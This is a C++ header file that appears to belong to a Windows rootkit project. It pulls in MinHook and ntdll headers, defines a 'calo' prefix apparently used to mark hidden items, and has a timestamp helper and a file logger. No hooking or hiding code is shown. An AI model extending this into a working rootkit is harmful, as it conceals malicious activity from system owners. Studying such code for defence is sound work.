#pragma once
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iterator>
#include <vector>
#include <time.h>
#include "MinHook\MinHook.h"
#include "ntstructs.h"
#include "Rootkit.h"
#include "ntdll.h"
#pragma comment (lib, "ntdll.lib")

#define ROOTKIT_PREFIX L"calo"
#define ROOTKIT_PREFIX_SIZE 4

inline std::string getCurrentDateTime(std::string s) {
	time_t now = time(0);
	struct tm  tstruct;
	char buf[80];
	tstruct = *localtime(&now);
	if (s == "now")
		strftime(buf, sizeof(buf), "%Y-%m-%d %X", &tstruct);
	else if (s == "date")
		strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);
	return std::string(buf);
}
inline void Logger(std::string logMsg) {
	std::string filePath = "c:\\logs\\log " + getCurrentDateTime("date") + ".txt";
	std::string now = getCurrentDateTime("now");
	std::ofstream ofs(filePath.c_str(), std::ios_base::out | std::ios_base::app);
	ofs << now << ' ' << logMsg << '\n';
	ofs.close();
}

